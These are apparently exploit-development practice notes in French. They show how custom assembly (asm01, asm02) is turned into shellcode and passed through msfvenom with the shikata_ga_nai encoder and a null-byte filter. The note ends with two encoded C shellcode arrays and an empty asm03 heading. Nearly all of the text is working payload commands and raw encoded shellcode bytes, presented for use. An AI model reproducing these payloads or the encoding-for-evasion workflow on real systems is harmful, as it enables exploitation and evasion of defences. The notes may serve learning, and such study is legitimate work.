./create_shellcode.sh asm01 > messagebox.bin
// On fait en sorte d'obtenir dans messagebox.bin le shellcode en "\x68..." avec des NullBytes
cat messagebox.bin | msfvenom -p - -a x86 --platform linux -e x86/shikata_ga_nai -fc -b '\x00'

// l'option -b va nous permettre de retirer les NullBytes

//On obtient pour asm01 :

unsigned char buf[] = 
"\xdb\xcd\xd9\x74\x24\xf4\x5a\x2b\xc9\xbd\xbb\x9d\x53\xd8"
"\xb1\x0d\x31\x6a\x18\x03\x6a\x18\x83\xc2\xbf\x7f\xa6\x84"
"\xc7\x1d\x71\x69\x4f\xd2\xb0\xcd\xd7\x22\x83\xb1\x5f\x73"
"\xd3\x15\xe7\x43\x23\xfa\x6f\xc6\x21\x5e\xf7\x36\x96\x02"
"\x7f\x07\xe6\xe6\x07\x57\x36\x4b\x8f\xa7\x06\x2f\x17\xab"
"\x02\x93\x9f\x13\xfb\x21";

//asm02 : 

unsigned char buf[] = 
"\xbb\x50\x73\x52\xed\xd9\xcd\xd9\x74\x24\xf4\x58\x33\xc9"
"\xb1\x23\x31\x58\x13\x03\x58\x13\x83\xe8\xac\x91\xa7\xb1"
"\x34\x34\x70\x16\xbc\x88\xb4\xfa\x44\xd9\x84\x5e\xcc\x29"
"\xd5\x02\x54\x7a\x25\xe7\xdc\x18\x27\x4b\x64\xed\x96\x2f"
"\xec\x3d\xe9\x93\x74\x0e\x39\x70\xfc\x5e\x09\xd4\x84\xfc"
"\x50\xb8\x0c\x31\x93\x1c\x94\x50\xe3\xc0\x1c\xa3\x37\xa5"
"\xa4\xf3\x0f\x09\x2c\x96\x0e\xed\xb4\x66\xe4\x51\x3c\xb7"
"\x36\x36\xc4\x87\x06\x9a\x4c\xd8\x56\x7e\xd4\x7b\xf3\x22"
"\x5c\x44\xcb\x86\xe4\xd6\x13\x6b\x6c\x27\x55\xcf\xf4\x77"
"\xa5\xb3\x7c\x48\xf5\x17\x04\x98\xc5\xfb\x8c\xba\x47\x58"
"\x14\x0b\xb8\x3c\x9c\x5b\x88\xe0\x24\xac\xd8\x44\xac\xfc"
"\x28\x29\x34\x9e\x2c\x8d\xbc\x58\x9d\x27";

//asm03


